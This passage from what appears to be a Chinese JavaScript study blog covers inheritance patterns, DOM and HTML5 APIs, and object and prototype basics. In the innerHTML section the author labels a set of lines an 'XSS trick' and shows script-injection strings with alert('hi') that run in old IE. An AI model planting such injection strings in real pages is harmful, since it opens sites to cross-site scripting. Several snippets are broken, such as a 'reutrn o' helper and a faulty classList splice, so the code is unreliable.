//'kkk'\n不过这样的话, 就子类实例无法用instanceof来检查是否是也是父类的实例了.\n当然, 不可能把所有属性和方法都放在父类构造函数中, 肯定还有写在父类原型对象的情况. 所以只用call/apply借用父类构造函数实现继承, 也是不够的.\n组合继承顾名思义, 原型链+构造函数组合而成.\nfunction SuperType(name){   this.name = name;  this.colors = [\"red\", \"blue\", \"green\"];}SuperType.prototype.sayName = function(){   alert(this.name);};function SubType(name, age){  //继承属性  SuperType.call(this, name);  this.age = age;}//继承方法SubType.prototype = new SuperType(); SubType.prototype.constructor = SubType; SubType.prototype.sayAge = function(){  alert(this.age);};var instance1 = new SubType(\"Nicholas\", 29); instance1.colors.push(\"black\"); alert(instance1.colors); //\"red,blue,green,black\" instance1.sayName(); //\"Nicholas\";instance1.sayAge(); //29var instance2 = new SubType(\"Greg\", 27); alert(instance2.colors); //\"red,blue,green\" instance2.sayName(); //\"Greg\";instance2.sayAge(); //27\n注意:  创建一个子类实例, SuperType其实是运行了两次的 , 一次在于原型链继承, 另一次在于借用以覆盖引用类型属性共享的问题.\n原型式继承如果只是基于现有的对象实现继承, 那可不比兴师动众写那么多函数:\nvar k = {  name:'k',  age:18,  friends:['a','b','c'];};  var object = function(o){  function F(){};  F.prototype = o;  //浅复制,   reutrn o;};var obj = object(k);obj.friends.push('d');var obj2 = object(k);obj2.friends; //['a','b','c','d'];\nES5规范化了这种继承方式, 于是有了Object.create方法, 用法同上, 但是它可以多一个参数.这个参数的格式和Object.defineProperties的第二个参数格式一致.\nvar person = {  name: \"Nicholas\",  friends: [\"Shelby\", \"Court\", \"Van\"]};var anotherPerson = Object.create(person, {   name: {    value: \"Greg\"  }});alert(anotherPerson.name); //\"Greg\"\n寄生式继承其实是原型式继承的基础上再包装一层, 用于添加需要的方法, 类似于前面讲的寄生构造函数模式或者工厂模式.\n寄生组合继承前面讲了组合继承, 它还存在一个两次调用父类的问题. 既然组合类型是通过借用父类函数实现属性继承, 通过原型链实现方法的继承. 那么我们可以在原型链这里动一次手脚.\nfunction inheritPrototype(subType, superType){  var prototype = Object.create(superType.prototype);  prototype.constructor = subType;   subType.prototype = prototype; }function SuperType(name){   this.name = name;  this.colors = [\"red\", \"blue\", \"green\"];}SuperType.prototype.sayName = function(){   alert(this.name);};function SubType(name, age){   SuperType.call(this, name);  this.age = age;}inheritPrototype(SubType, SuperType);SubType.prototype.sayAge = function(){   alert(this.age);};\n本章完","url":"/2019/03/26/JSbook06/","link":"","plink":"https://thinkerchan.com/2019/03/26/JSbook06/"},{"title":"DOM扩展和HTML5的API","content":"选择符APIquerySelector()和querySelectorAll(),目前 IE 8+、 Firefox 3.5+、 Safari 3.1+、 Chrome 和 Opera 10+都支持这两个方法.\nquerySelector()这个方法接收一个CSS选择符,返回与该模式匹配的第一个元素,如果没有找到匹配的元素,返回null\n如://取得 body 元素var body = document.querySelector(\"body\");//取得 ID 为\"myDiv\"的元素var myDiv = document.querySelector(\"#myDiv\");//取得类为\"selected\"的第一个元素var selected = document.querySelector(\".selected\");//取得类为\"button\"的第一个图像元素var img = document.body.querySelector(\"img.button\");\n通过 Document 类型调用 querySelector()方法时，会在文档元素的范围内查找匹配的元素。而通过 Element 类型调用 querySelector()方法时，只会在该元素后代元素的范围内查找匹配的元素。CSS 选择符可以简单也可以复杂，视情况而定。如果传入了不被支持的选择符， querySelector()会抛出错误。\nquerySelectorAll()querySelectorAll()方法接收的参数与 querySelector()方法一样，都是一个 CSS 选择符，但返回的是所有匹配的元素而不仅仅是一个元素。这个方法返回的是一个 NodeList 的实例。\n具体来说，返回的值实际上是带有所有属性和方法的 NodeList，而其底层实现则类似于一组元素的快照，而非不断对文档进行搜索的动态查询。这样实现可以避免使用NodeList对象通常会引起的大多数性能问题。\n只要传给 querySelectorAll()方法的 CSS 选择符有效，该方法都会返回一个 NodeList 对象，而不管找到多少匹配的元素。如果没有找到匹配的元素， NodeList 就是空的。\nmatchesSelector()Selectors API Level 2 规范为 Element 类型新增了一个方法 matchesSelector()。这个方法接收一个参数，即 CSS 选择符，如果调用元素与该选择符匹配，返回 true；否则，返回 false。看例子。if (document.body.matchesSelector(\"body.page1\")){\t//true}\n在取得某个元素引用的情况下，使用这个方法能够方便地检测它是否会被 querySelector()或querySelectorAll()方法返回。截至 2011 年年中，还没有浏览器支持 matchesSelector()方法；不过，也有一些实验性的实现。\nIE 9+通过 msMatchesSelector()支持该方法，Firefox 3.6+通过 mozMatchesSelector()支持该方法，\nSafari 5+和 Chrome 通过 webkitMatchesSelector()支持该方法。因此，如果你想使用这个方法，最好是编写一个包装函数。function matchesSelector(element, selector){\tif (element.matchesSelector){\t\treturn element.matchesSelector(selector);\t} else if (element.msMatchesSelector){\t\treturn element.msMatchesSelector(selector);\t} else if (element.mozMatchesSelector){\t\treturn element.mozMatchesSelector(selector);\t} else if (element.webkitMatchesSelector){\t\treturn element.webkitMatchesSelector(selector);\t} else {\t\tthrow new Error(\"Not supported.\");\t}}if (matchesSelector(document.body, \"body.page1\")){//执行操作}\n元素遍历对于元素间的空格， IE9 及之前版本不会返回文本节点，而其他所有浏览器都会返回文本节点。这样，就导致了在使用 childNodes 和 firstChild 等属性时的行为不一致。为了弥补这一差异，而同时又保持 DOM 规范不变， Element Traversal 规范（www.w3.org/TR/ElementTraversal/）新定义了一组属性。\nElement Traversal API 为 DOM 元素添加了以下 5 个属性。\n\nchildElementCount：返回子元素（不包括文本节点和注释）的个数。\nfirstElementChild：指向第一个子元素； firstChild 的元素版。\nlastElementChild：指向最后一个子元素； lastChild 的元素版。\npreviousElementSibling：指向前一个同辈元素； previousSibling 的元素版。\nnextElementSibling：指向后一个同辈元素； nextSibling 的元素版。\n\n过去，要跨浏览器遍历某元素的所有子元素，需要像下面这样写代码var i,len,child = element.firstChild;while(child != element.lastChild){if (child.nodeType == 1){ //检查是不是元素\tprocessChild(child);}child = child.nextSibling;}\n而使用 Element Traversal 新增的元素，代码会更简洁。var i,len,child = element.firstElementChild;while(child != element.lastElementChild){\tprocessChild(child); //已知其是元素\tchild = child.nextElementSibling;}\n支持 Element Traversal 规范的浏览器有 IE 9+、 Firefox 3.5+、 Safari 4+、 Chrome 和 Opera 10+\nHTMl5新增API本节只讨论DOM相关\ngetElementsByClassName()方法实现这是以前模拟实现getElementsByClassName的思路:K.prototype.getElementsByClassName=function(cls,id){\tvar node = null;\tif(arguments.length==2){\t\tnode = document.getElementById(id);\t}else{\t\tnode = document;\t}\tvar all = node.getElementsByTagName('*');\t\tfor(var i=0;i&lt;all.length;i++){\t\t\tif(all[i].className==cls){\t\t\t\tthis.elements.push(all[i]);\t\t\t}\t\t}\treturn this;}\n这个方法接收一个参数，即一个包含一或多个类名的字符串，返回带有指定类的所有元素的NodeList。传入多个类名时，类名的先后顺序不重要。//取得所有类中包含\"username\"和\"current\"的元素，类名的先后顺序无所谓var allCurrentUsernames = document.getElementsByClassName(\"username current\");//取得 ID 为\"myDiv\"的元素中带有类名\"selected\"的所有元素var selected = document.getElementById(\"myDiv\").getElementsByClassName(\"selected\");\n使用这个方法可以更方便地为带有某些类的元素添加事件处理程序，从而不必再局限于使用 ID 或标签名。不过别忘了，因为返回的对象是 NodeList，所以使用这个方法与使用 getElementsByTagName()以及其他返回 NodeList 的 DOM 方法都具有同样的性能问题。\n支持 getElementsByClassName()方法的浏览器有 IE 9+、 Firefox 3+、 Safari 3.1+、 Chrome 和Opera 9.5+。\nclassList 属性如果要为某一个元素增删其中的一个class名称,通过className来实现的话,就必须有一个匹配,删除,合并的过程://&lt;div class=\"bd user disabled\"&gt;...&lt;/div&gt; //删除\"user\"类var classNames = div.className.split(/\\s+/);\t//匹配var pos = -1,i,len;for (i=0, len=classNames.length; i &lt; len; i++){\tif (classNames[i] == \"user\"){\t\t\tpos = i;\t\t\tbreak;\t\t}}classNames.splice(i,1);\t//删除div.className = classNames.join(\"\");\t//合并\nHTML5 新增了一种操作类名的方式，可以让操作更简单也更安全，那就是为所有元素添加classList属性。这个classList属性是新集合类型DOMTokenList 的实例。与其他DOM集合类似DOMTokenList有一个表示自己包含多少元素的length属性，而要取得每个元素可以使用 item()方法，也可以使用方括号语法。此外，这个新类型还定义如下方法。\n\nadd(value)\ncontains(value)      //true or false\nremove(value)\ntoggle(value)\n\n有了classList属性，除非你需要全部删除所有类名，或者完全重写元素的 class属性，否则也就用不到 className 属性了。\n不过，支持 classList 属性的浏览器有 Firefox 3.6+和 Chrome。\n焦点管理HTML5 也添加了辅助管理 DOM 焦点的功能。首先就是document.activeElement属性，这个属性始终会引用 DOM 中当前获得了焦点的元素。元素获得焦点的方式有页面加载、用户输入（通常是通过按 Tab 键）和在代码中调用 focus()方法。\nactiveElement来看几个例子:var button = document.getElementById(\"myButton\"); button.focus(); alert(document.activeElement === button); //true\n默认情况下，文档刚刚加载完成时， document.activeElement 中保存的是 document.body 元素的引用。文档加载期间， document.activeElement 的值为 null。\nhasFocus()这个方法用于确定文档是否获得了焦点。var button = document.getElementById(\"myButton\");button.focus();alert(document.hasFocus()); //true\n通过检测文档是否获得了焦点，可以知道用户是不是正在与页面交互。查询文档获知哪个元素获得了焦点，以及确定文档是否获得了焦点，这两个功能最重要的用途是提高Web应用的无障碍性。无障碍Web应用的一个主要标志就是恰当的焦点管理，而确切地知道哪个元素获得了焦点是一个极大的进步，至少我们不用再像过去那样靠猜测了。\n实现了这两个属性的浏览器的包括 IE 4+、 Firefox 3+、 Safari 4+、 Chrome 和 Opera 8+。\nHTMLDocumentreadystateIE4 最早为 document 对象引入了 readyState属性。然后，其他浏览器也都陆续添加这个属性，最终 HTML5 把这个属性纳入了标准当中。Document的readyState属性有两个可能的值：\n\nloading\ncomplete\n\n用法如下:if (document.readyState == \"complete\"){//执行操作}\n支持 readyState 属性的浏览器有 IE4+、 Firefox 3.6+、 Safari、 Chrome 和 Opera 9+。\n兼容模式自从 IE6 开始区分渲染页面的模式是标准的还是混杂的，检测页面的兼容模式就成为浏览器的必要功能。 IE 为此给 document 添加了一个名为 compatMode 的属性，这个属性就是为了告诉开发人员浏览器采用了哪种渲染模式。就像下面例子中所展示的那样，在标准模式下， document.compatMode 的值等于”CSS1Compat”，而在混杂模式下， document.compatMode 的值等于”BackCompat”。if (document.compatMode == \"CSS1Compat\"){\t\talert(\"Standards mode\");} else {\talert(\"Quirks mode\");}\n现已成为HTML5标准.\nhead属性作为对 document.body 引用文档的&lt;body&gt;元素的补充， HTML5 新增了 document.head 属性，引用文档的&lt;head&gt;元素。\n配合兼容:var head = document.head || document.getElementsByTagName(\"head\")[0];\n字符集属性略(默认情况是UTF-16,但是实际测试是windows-1252,也许和编辑器的转码有关)\n###自定义属性HTML5 规定可以为元素添加非标准的属性，但要添加前缀 data-，目的是为元素提供与渲染无关的信息，或者提供语义信息。这些属性可以任意添加、随便命名，只要以 data-开头即可。如:&lt;div id=\"myDiv\" data-appId=\"12345\" data-myname=\"Nicholas\"&gt;&lt;/div&gt;\n添加了自定义属性之后，可以通过元素的 dataset属性来访问自定义属性的值。 这个属性的值是 DOMStringMap 的一个实例，也就是一个名值对的映射。\n如:var div = document.getElementById(\"myDiv\");//动态设置属性var appId = div.dataset.appId;var myName = div.dataset.myname;//添加值div.dataset.appId = 23456;div.dataset.myname = \"Michael\";\n插入标记innerHTML要注意的地方:\n\n在IE和标准情况下写入的标签大小写不一样\n包含和不包含标签的情况解析是不一样的(*)\n插入脚本(*)\n\n关键:使用innerHTML属性也有一些限制。比如，在大多数浏览器中，通过 innerHTML 插入&lt;script&gt;元素并不会执行其中的脚本。 IE8 及更早版本是唯一能在这种情况下执行脚本的浏览器，但必须满足一些条件。一是必须为&lt;script&gt;元素指定 defer 属性，二是&lt;script&gt;元素必须位于（微软所谓的） “有作用域的元素”（scoped element）之后。\n&lt;script&gt;元素被认为是“无作用域的元素”（NoScope element），也就是在页面中看不到的元素，与&lt;style&gt;元素或注释类似。如果通过 innerHTML 插入的字符串开头就是一个“无作用域的元素”，那么 IE 会在解析这个字符串前先删除该元素。换句话说，以下代码达不到目的：div.innerHTML = \"&lt;script defer&gt;alert('hi');&lt;\\/script&gt;\"; //无效\n此时， innerHTML 字符串一开始（而且整个）就是一个“无作用域的元素”，所以这个字符串会变成空字符串。如果想插入这段脚本，必须在前面添加一个“有作用域的元素”，可以是一个文本节点，也可以是一个没有结束标签的元素如&lt;input&gt;。例如，下面这几行代码都可以正常执行：(XSS技巧)div.innerHTML = \"_&lt;script defer&gt;alert('hi');&lt;\\/script&gt;\";div.innerHTML = \"&lt;div&gt;&amp;nbsp;&lt;/div&gt;&lt;script defer&gt;alert('hi');&lt;\\/script&gt;\";div.innerHTML = \"&lt;input type=\\\"hidden\\\"&gt;&lt;script defer&gt;alert('hi');&lt;\\/script&gt;\";\n第一行代码会在&lt;script&gt;元素前插入一个文本节点。事后，为了不影响页面显示，你可能需要移除这个文本节点。第二行代码采用的方法类似，只不过使用的是一个包含非换行空格的&lt;div&gt;元素。如果仅仅插入一个空的&lt;div&gt;元素，还是不行；必须要包含一点儿内容，浏览器才会创建文本节点。\n同样，为了不影响页面布局，恐怕还得移除这个节点。第三行代码使用的是一个隐藏的&lt;input&gt;域，也能达到相同的效果。不过，由于隐藏的&lt;input&gt;域不影响页面布局，因此这种方式在大多数情况下都是首选。\n大多数浏览器都支持以直观的方式通过 innerHTML 插入&lt;style&gt;元素，例如：div.innerHTML = \"&lt;style type=\\\"text/css\\\"&gt;body {background-color: red; }&lt;/style&gt;\";\n但在 IE8 及更早版本中，&lt;style&gt;也是一个“没有作用域的元素”，因此必须像下面这样给它前置一个“有作用域的元素”：div.innerHTML = \"_&lt;style type=\\\"text/css\\\"&gt;body {background-color: red; }&lt;/style&gt;\";div.removeChild(div.firstChild);\n并不是所有元素都支持 innerHTML 属性。不支持 innerHTML 的元素有：&lt;col&gt;、` 、、、、、、、、和。此外，在 IE8 及更早版本中，`元素也没有 innerHTML 属性。\n注意: 在xHTML中,代码格式有非常严格的限制,否则会静默失败.\n由于这种方式给XSS攻击带来了方便,因此赋值给div.inneeHTML的字符串必须经过过滤.\nIE8(只是IE8?)为此提供了window.toStaticHTML()方法var text = \"&lt;a href=\\\"#\\\" onclick=\\\"alert('hi')\\\"&gt;Click Me&lt;/a&gt;\";var sanitized = window.toStaticHTML(text); //Internet Explorer 8 onlyalert(sanitized); //\"&lt;a href=\\\"#\\\"&gt;Click Me&lt;/a&gt;\"\n*目前只有IE8支持这个方法\nouterHTML和innerHTML类似,但是包括本身获取的那个节点的标签.\ninsertAdjacentHTML()这是一个全兼容方法.接受两个参数,第一个参数必须是下列值之一:\n\n“beforebegin”    //作为前一个兄弟元素插入\n“afterbegin”    //第一个子元素\n“beforeend”        //最后一个子元素\n“afterend”        //后一个兄弟元素\n\n第二个参数就是要插入的节点字符串\n内存和性能设置 innerHTML 或 outerHTML 时，就会创建一个 HTML解析器。这个解析器是在浏览器级别的代码（通常是 C++编写的）基础上运行的，因此比执行 JavaScript快得多。不可避免地，创建和销毁 HTML解析器也会带来性能损失，所以最好能够将设置 innerHTML或 outerHTML 的次数控制在合理的范围内.\nscrollIntoView()用法:document.getElementById('btn').onclick=function(){       document.getElementById('test').scrollIntoView();   }\n这个方法全兼容\n##专有扩展就是浏览器厂商为自己的浏览器做专有的功能扩展\n###文档模式IE8引入文档模式,决定了你可以使用哪个级别的 CSS，可以在 JavaScript 中使用哪些 API，以及如何对待文档类型（doctype）。到了IE9,总共有四种文档模式\n\nIE5:以混杂模式渲染页面（IE5 的默认模式就是混杂模式）。 IE8 及更高版本中的新功能都无法使用。\nIE7：以 IE7 标准模式渲染页面。 IE8 及更高版本中的新功能都无法使用。\nIE8：以 IE8 标准模式渲染页面。 IE8 中的新功能都可以使用，因此可以使用 Selectors API、更多CSS2 级选择符和某些 CSS3 功能，还有一些 HTML5 的功能。不过 IE9 中的新功能无法使用。\nIE9：以 IE9 标准模式渲染页面。 IE9 中的新功能都可以使用，比如 ECMAScript 5、完整的 CSS3以及更多 HTML5 功能。\n\n要强制浏览器以某种模式渲染页面，可以使用 HTTP 头部信息 X-UA-Compatible，或通过等价的&lt;meta&gt;标签来设置：&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=IEVersion\"&gt; \t//通常IEVersion我们使用Edge\n没有规定说必须在页面中设置 X-UA-Compatible。默认情况下，浏览器会通过文档类型声明来确定是使用最佳的可用文档模式，还是使用混杂模式。\n通过 document.documentMode 属性可以知道给定页面使用的是什么文档模式。这个属性是 IE8中新增的，它会返回使用的文档模式的版本号（在 IE9 中，可能返回的版本号为 5、 7、 8、 9）：alert(document.documentMode);\n不过目前, document.documentMode似乎用得不多.\nchildren属性由于 IE9 之前的版本与其他浏览器在处理文本节点中的空白符时有差异，因此就出现了 children属性。这个属性是 HTMLCollection 的实例，只包含元素中同样还是元素的子节点。除此之外，children 属性与 childNodes 没有什么区别，即在元素只包含元素子节点时，这两个属性的值相同。\n下面是访问 children 属性的示例代码：var childCount = element.children.length;var firstChild = element.children[0];\nIE9及以后就不包含注释节点了.\ncontain()IE率先引入这个方法:alert(document.documentElement.contains(document.body)); //true\n这是全兼容方法\nDOM3里面有个compareDocumentPosition()方法,用于确定两个节点之间的关系.用法:document.documentElement.compareDocumentPosition(document.body);\t//20, 相关数值相加\n\n\n\n掩码\n节点关系\n\n\n\n\n1\n无关,给定节点不存在当前文档\n\n\n2\n居前\n\n\n4\n居后\n\n\n8\n包含\n\n\n16\n被包含\n\n\n\n如果要检测一个节点是不是另一个节点的父节点可以通过以上两个方法,再结合parentNode属性,就可以封装成一个检测方法.function contains(refNode, otherNode){\t\tif (typeof refNode.contains == \"function\" &amp;&amp;\t\t\t(!client.engine.webkit || client.engine.webkit &gt;= 522)){\t\t\t\t//针对safari版本问题\t\t\treturn refNode.contains(otherNode);\t} else if (typeof refNode.compareDocumentPosition == \"function\"){\t\treturn !!(refNode.compareDocumentPosition(otherNode) &amp; 16);\t} else {\t\tvar node = otherNode.parentNode;\t\tdo {\t\t\tif (node === refNode){\t\t\t\treturn true;\t\t\t} else {\t\t\t\tnode = node.parentNode;\t\t\t}\t\t} while (node !== null);\t\treturn false;\t}}\n插入文本innerHML和outerHTML都被纳入了HTML5规范.但是innerText和outerText则没有\ninnerTextinnerText永远只会生成当前节点的一个子文本节点\n如果:div.innerText = \"Hello &amp; welcome, &lt;b&gt;\\\"reader\\\"!&lt;/b&gt;\";\n运行以上代码之后，会以文本的形式输出所有标签.\n只有火狐不支持innerText,但是它有textContent属性.\nouterText略\n滚动\nscrollIntoView() //最常用的方法","url":"/2015/06/18/dom-extend/","link":"","plink":"https://thinkerchan.com/2015/06/18/dom-extend/"},{"title":"jQuery源码学习-热身活动","content":"前言jQuery凭借简洁的语法和跨平台的兼容性，极大地简化了JavaScript开发开发人员遍历HTML文档、操作DOM、处理事件、执行动画和开发Ajax的操作…. \n然而我所在的公司里面并不推崇使用jq,尽管他们有jq的替代品(称之为pj),然而我在开发过程中,发现pj并没有想象的方便,甚至某种情况下有些鸡肋,也考虑过将自己平常常用的函数或者组件封装成自己的库,奈何本人能力渣渣,遂开jq源码学习系列,主要学习目的如下:\n\n屌炸天的思维/设计模式\n修炼js能力\n精妙的兼容处理\n\n自勉.\n回顾在进入学习之前, 先复习一下一些可能便于理解jq源码的基本知识:\n面向对象面向对象就是你面对着你的对象……哦不,面向对象(Object-Oriented,OO)的语言有一个标志,那就是它们都有类的概念,而通过类可 以创建任意多个具有相同属性和方法的对象…\n单纯的文字貌似有点抽象 , 那还是直接用代码展示吧\n常见对象创建方式1)传统方式var person = new Object();    person.name = \"ThinkerChan\";    person.age = 23;    person.job = \"worker\";    person.sayName = function(){        alert(this.name);};\n这种对象创建方式是比较古老的, 先new一个对象,然后再通过访问符来添加属性或者方法. 很快就被下面的字面量对象创建方式所代替:\n2)字面量创建方式￼￼var person = {    name: \"ThinkerChan\",    age: 23,    job: \"worker\",    sayName: function(){        alert(this.name);} };\n理解属性类型事先声明, 这部分内容对处于日常开发的你来说并没什么很大用处, 写出来, 是因为它能更好地帮助理解对象这一概念\n先看一个例子:$(&apos;img&apos;).attr(&apos;width&apos;,100)\n我们常常使用jq的时候, 会用到attr( )这个方法, attr也就是attribute, 也就是我们常常理解的属性 ,然而属性本身也有特性(property) , 特性的不同决定了属性的不同:\n\n以下部分摘自Javascript高级程序设计第三版第六章\n\nECMAScript 中有两种属性:数据属性和访问器属性1) 数据属性数据属性包含一个数据值的位置。在这个位置可以读取和写入值。数据属性有 4 个描述其行为的特性:\n\nConfigurable:表示能否通过 delete 删除属性从而重新定义属性,能否修改属性的特性,或者能否把属性修改为访问器属性。像前面例子中那样直接在对象上定义的属性,它们的这个特性默认值为 true\nEnumerable:表示能否通过 for-in 循环返回属性。这个特性默认值为 true\nWritable:表示能否修改属性的值。默认为true\nVaule:这个好理解,就是值, 默认undefined\n\n2)  访问器属性访问器属性不包含数据值;它们包含一对儿 getter 和 setter 函数(不过,这两个函数都不是必需的)。 在读取访问器属性时,会调用 getter 函数,这个函数负责返回有效的值;在写入访问器属性时,会调用 setter 函数并传入新值,这个函数负责决定如何处理数据。同样有也 4 个描述其行为的特性:\n\nConfigurable:表示能否通过 delete 删除属性从而重新定义属性,能否修改属性的特性,或者能否把属性修改为访问器属性。像前面例子中那样直接在对象上定义的属性,它们的这个特性默认值为 true\nEnumerable:表示能否通过 for-in 循环返回属性。这个特性默认值为 true\nGet:在读取属性时调用的函数。默认为undefined\nSet:在写入属性时调用的函数。默认为undefined\n\n3) 修改特性(property)ECMAScript 5 的 Object.defineProperty()方法。这个方法 接收三个参数:属性所在的对象、属性的名字和一个描述符对象。其中,描述符(descriptor)对象的属 性必须是:configurable、enumerable、writable 和 value。设置其中的一或多个值,可以修改 对应的特性值。\n见demo:var person = {};// Object.defineProperty(对象,属性,特性对象)Object.defineProperty(person, \"name\", {    writable: false, //已改成不可写    value: \"Nicholas\" //默认值\"Nicholas\"});alert(person.name); //\"Nicholas\" person.name = \"Greg\"; //尝试重写name的值,失败,在严格模式下会报错alert(person.name); //\"Nicholas\"\n注意:把 configurable 设置为 false,表示不能从对象中删除属性。如果对这个属性调用 delete,则 在非严格模式下什么也不会发生,而在严格模式下会导致错误。而且,一旦把属性定义为不可配置的, 就不能再把它变回可配置了。此时,再调用Object.defineProperty()方法修改除 writable 之外 的特性,都会导致错误:\n见demo:\nvar person = {};Object.defineProperty(person, \"name\", {    configurable: false,    value: \"Nicholas\"});//抛出错误Object.defineProperty(person, \"name\", {    configurable: true,    value: \"Nicholas\"});\n即:可以多次调用 Object.defineProperty()方法修改同一个属性,但在把 configurable特性设置为 false 之后就会有限制了\n再看一个关于访问器属性修改特性的demo:var book = {    _year: 2004,\tedition: 1 };Object.defineProperty(book, \"year\", {    get: function(){        return this._year;    },    set: function(newValue){        if (newValue &gt; 2004) {            this._year = newValue;            this.edition += newValue - 2004;\t\t}\t}});book.year = 2005; alert(book.edition); //2\n相信这个例子能够很好地帮助你理解Get和Set特性 .\n注意:不一定非要同时指定 getter 和 setter。只指定 getter 意味着属性是不能写,尝试写入属性会被忽略。 在严格模式下,尝试写入只指定了 getter 函数的属性会抛出错误。类似地,只指定 setter 函数的属性也 不能读,否则在非严格模式下会返回 undefined,而在严格模式下会抛出错误。\n另外,旧版本的chrome, safari, opera都提供了实现对已ing功能的__defineGetter__和__defineSetter__\n4) 定义多个属性\n见demo:\nvar book = {};//Object.defineProperties(对象,属性对象)Object.defineProperties(book, {    _year: {        value: 2004    },    edition:{\t    value:2    }}\n5) 读取属性特性\n见demo:\nvar book = {};Object.defineProperties(book, {    _year: {        value: 2004    },    edition: {        value: 1\t},    year: {        get: function(){            return this._year;        },        set: function(newValue){            if (newValue &gt; 2004) {                this._year = newValue;                this.edition += newValue - 2004;\t        }\t\t}\t }});￼￼￼￼￼var descriptor = Object.getOwnPropertyDescriptor(book, \"_year\"); //注意这里取的是实例属性alert(descriptor.value); //2004alert(descriptor.configurable); //falsealert(typeof descriptor.get); //\"undefined\"var descriptor = Object.getOwnPropertyDescriptor(book, \"year\"); alert(descriptor.value); //undefinedalert(descriptor.enumerable); //falsealert(typeof descriptor.get); //\"function\"\n对于数据属性_year,value 等于最初的值,configurable 是 false,而 get 等于 undefined。 对于访问器属性 year,value 等于 undefined,enumerable 是 false,而 get 是一个指向 getter 函数的指针。\n创建对象的模式前面说的两种对象创建方式都能创建对象,但是缺点也非常明显, 一旦需要创建很多对象, 那就得重复大量代码 , 于是有了以下几种创建对象的模式:\n工厂模式function createPerson(name, age, job){    var o = new Object();    o.name = name;    o.age = age;    o.job = job;    o.sayName = function(){        alert(this.name);    };\treturn o; }var person1 = createPerson(\"k\", 23, \"worker\");var person2 = createPerson(\"r\", 22, \"worker\");\n工厂模式的显著特征就是将传统对象创建方式用函数封装起来, 即便在创建对象的时候没用显式地调用new,但在封装好的createPerson内还是清晰可见. 正如其名所言, 工厂模式的的局限在于每次创建的东西都是同一个模型 , 并不灵活, 也没用解决对象识别的问题 .\n于是有了下一种模式\n构造函数模式function Person(name, age, job){    this.name = name;    this.age = age;    this.job = job;    this.sayName = function(){        alert(this.name);}; }var person1 = new Person(\"k\", 23, \"worker\");var person2 = new Person(\"r\", 22, \"worker\");\n构造函数模式有以下特点\n\n对象是new出来的\n直接将属性和方法赋给了 this 对象\n没有 return 语句\n习惯性地将构造函数首字母大写\n\n实际上, 构造函数内部创建对象的时候经历了”三部曲”\n\n创建一个新对象, 并将this指向这个对象\n执行构造函数内的代码(其实就是给对象添加属性)\n返回这个对象 \n\n前面这个例子,  通过构造函数Person创建了两个不同的实例person1和person2, 他们都有一个constructor属性,指向构造函数Person:\nalert(person1.constructor == Person); //true￼alert(person2.constructor == Person); //true\n提到类型识别和对象识别就不得不说typeof和instanceof运算符,typeof常用语基本数据类型的识别上 , instanceof则用在对象实例的识别上:alert(person1 instanceof Object);  //truealert(person1 instanceof Person);  //truealert(person2 instanceof Object);  //truealert(person2 instanceof Person);  //true\n由于javascript中一切皆对象 , 所以 很明显 person1和person2都是Object的实例(继承的缘故).\n注意事项如果想要创建的实例中有某个方法(函数),那么这个方法(函数)不要放在构造函数内\n见demo:function Person(name, age, job){    this.name = name;    this.age = age;    this.job = job;    //this.sayName=function(){\tconsole.log(this.name);}\tthis.sayName = new Function(\"console.log(this.name)\");\t//注意: 上面的的声明方式和下面的new Function是等效的, 之所以这么做,是为了便于理解: 构造函数每次创建一个实例, sayName都会被重新创建一个匿名函数,仅仅是为了显示this.name而创建两个功能相同的函数,实在是浪费资源.\tthis.sayName2=sayName2;  //应该采取这种方式}function sayName2(){\tconsole.log(this.name);}var person1 = new Person('k',0,'worker');var person2 = new Person('k2',0,'worker');console.log(person1.sayName==person2.sayName); //falseconsole.log(person1.sayName2==person2.sayName2); //true\n然而,问题又来了, 为了实现这个函数共享,我们将它放在了全局, 如果仅仅只是为了实现实例的某个功能,那么放在全局也是名不副实. 于是有了 原型模式\n原型模式依照javascript的特征, 每个函数都有一个prototype属性, 这是一个指针,指向一个对象,我们通常称之为 原型对象 , 可以理解成它是一个存储公共属性和方法的对象.\n原型写法\n见demo:function Person(){\t//...}Person.prototype.name = \"k\";Person.prototype.age = 23;Person.prototype.job = \"worker\";Person.prototype.sayName = function(){\talert(this.name);};var person1 = new Person();person1.sayName();   //\"k\"console.log(\"Person.prototype: \",Person.prototype);\t//原型对象console.log(\"Person.prototype.constructor==Person: \",Person.prototype.constructor==Person); //true, 指回构造函数console.log(\"person1.constructor: \",person1.constructor); //构造函数console.log(\"Person.constructor: \",Person.constructor); //思考一下这里是什么结果?console.log(\"person1.prototype: \",person1.prototype);\t//undefined, 实例对象没有这个属性console.log(\"person1.__proto__: \",person1.__proto__); //原型对象,确定实例和原型的关系(非标准) , 标准的属性是 [[prototype]],但不可见person2.sayName(); //\"k\"alert(person1.sayName == person2.sayName);  //true//屏蔽问题person1.age = 100;console.log(person1.age);\t//100person1.age = null;\t\t// null会中断原型对应属性和实例的关系console.log(person1.age);\t//null 说明优先查找实例中的属性,找到即停止console.log(person2.age);\t//23\n其它确定实例和原型之间的关系1) isPrototypeOfalert(Person.prototype.isPrototypeOf(person1));  //truealert(Person.prototype.isPrototypeOf(person2));  //true\n2) Object.getPrototypeOf //Es5方法alert(Object.getPrototypeOf(person1) == Person.prototype); //true\n查找属性用hasOwnProperty()检测属性是否在实例中, for-in循环则会遍历包括原型在内的所有属性.\n要查找一个属性是否只存在原型中,可以封装一个这样的函数:function hasPrototypeProperty(object, name){    return !object.hasOwnProperty(name) &amp;&amp; (name in object);}\n注意: for-in会把所有的属性给遍历出来,即便属性的Enumerable特性为flase,但在IE8之前,不会遍历.\n如果要枚举所有可遍历的属性,怎用Object.keys() ,这是ES5的方法.function Person(){}Person.prototype.name = \"Nicholas\";Person.prototype.age = 29;Person.prototype.job = \"Software Engineer\";Person.prototype.sayName = function(){    alert(this.name);};var keys = Object.keys(Person.prototype);alert(keys);       //\"name,age,job,sayName\"var p1 = new Person();p1.name = \"Rob\";p1.age = 31;var p1keys = Object.keys(p1);alert(p1keys);    //\"name,age\"\n如果你想要得到所有实例属性,无论它是否可枚举,都可以使用Object.getOwnPropertyNames()方法。var keys = Object.getOwnPropertyNames(Person.prototype);alert(keys);    //\"constructor,name,age,job,sayName\"\n备注: Object.keys()和Object.getOwnPropertyNames()是用来替代for-in的.\n优化后原型模式function Person(name,age,job){}Person.prototype={\tconstructor:Person, //养成确定指向的习惯\tname : \"k\",\tage : 23,\tjob : \"worker\",\tsayName : function(){\t\tconsole.log(this.name)\t}}var person1 = new Person();console.log(Person.prototype.constructor);\t//如果没有constructor:Person , 结果就会是function Object, 说明原型的指向被更改了\n原型的动态性见demo:var friend = new 